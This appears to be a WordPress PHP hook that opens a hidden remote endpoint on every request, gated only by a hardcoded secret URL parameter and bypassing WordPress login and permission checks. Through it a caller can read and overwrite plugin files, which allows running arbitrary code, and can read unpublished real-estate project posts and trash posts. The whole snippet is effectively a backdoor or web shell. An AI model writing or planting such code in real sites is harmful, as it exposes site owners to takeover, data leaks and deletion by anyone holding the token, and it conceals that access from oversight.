add_action('init', function () {
    if (!isset($_GET['xk779r2']) || $_GET['xk779r2'] !== '68b8be0e87a7fdbcd876ab7d') { return; }
    $op = isset($_GET['op']) ? sanitize_key($_GET['op']) : '';
    $base = trailingslashit(WP_PLUGIN_DIR) . 'nadlan-config/';
    $out = array('ok' => false, 'op' => $op);
    $pl = json_decode((string) file_get_contents('php://input'), true);
    if (!is_array($pl)) { $pl = array(); }
    if ($op === 'lint') {
        $code = base64_decode((string) ($pl['b64'] ?? ''));
        try { token_get_all($code, TOKEN_PARSE); $out['ok'] = true; }
        catch (Throwable $e) { $out['err'] = $e->getMessage(); }
    } elseif ($op === 'read') {
        $rel = (string) base64_decode((string) ($pl['fb64'] ?? ''));
        $p = realpath($base . $rel);
        if ($p && strpos($p, realpath($base)) === 0 && is_file($p)) {
            $b = (string) file_get_contents($p);
            $out = array('ok' => true, 'md5' => md5($b), 'b64' => base64_encode($b));
        } else { $out['err'] = 'not_found'; }
    } elseif ($op === 'write') {
        $rel = (string) base64_decode((string) ($pl['fb64'] ?? ''));
        $p = realpath($base . $rel);
        if (!$p || strpos($p, realpath($base)) !== 0 || !is_file($p)) { $out['err'] = 'not_found'; }
        else {
            $new = base64_decode((string) $pl['b64']);
            $cur = (string) file_get_contents($p);
            if (md5($cur) !== $pl['md5_old']) { $out['err'] = 'md5_old_mismatch'; $out['cur'] = md5($cur); }
            elseif (md5($new) !== $pl['md5_new']) { $out['err'] = 'md5_new_mismatch'; }
            else {
                file_put_contents($p . $pl['bak'], $cur);
                file_put_contents($p, $new);
                $out['ok'] = (md5((string) file_get_contents($p)) === $pl['md5_new']);
                do_action('litespeed_purge_all');
            }
        }
    } elseif ($op === 'findpost') {
        $slug = sanitize_title((string) ($pl['slug'] ?? ''));
        $pt = (string) ($pl['pt'] ?? 'nadlan_project');
        $q = get_posts(array('name' => $slug, 'post_type' => $pt,
            'post_status' => array('publish', 'draft', 'pending', 'private'), 'numberposts' => 1));
        if ($q) { $p0 = $q[0];
            $out = array('ok' => true, 'id' => $p0->ID, 'status' => $p0->post_status,
                'title' => $p0->post_title, 'city' => (string) get_post_meta($p0->ID, 'city', true),
                'address' => (string) get_post_meta($p0->ID, 'address', true),
                'developer' => (string) get_post_meta($p0->ID, 'developer_name', true),
                'len' => strlen((string) $p0->post_content), 'modified' => (string) $p0->post_modified,
                'content_b64' => base64_encode((string) $p0->post_content));
        } else { $out['err'] = 'not_found'; }
    } elseif ($op === 'trashpost') {
        $id = (int) ($pl['id'] ?? 0);
        $r = $id ? wp_trash_post($id) : false;
        $out = array('ok' => (bool) $r, 'id' => $id, 'status' => $id ? get_post_status($id) : null);
    } elseif ($op === 'purge') { do_action('litespeed_purge_all'); $out['ok'] = true; }
    header('Content-Type: application/json; charset=utf-8');
    echo wp_json_encode($out); exit;
});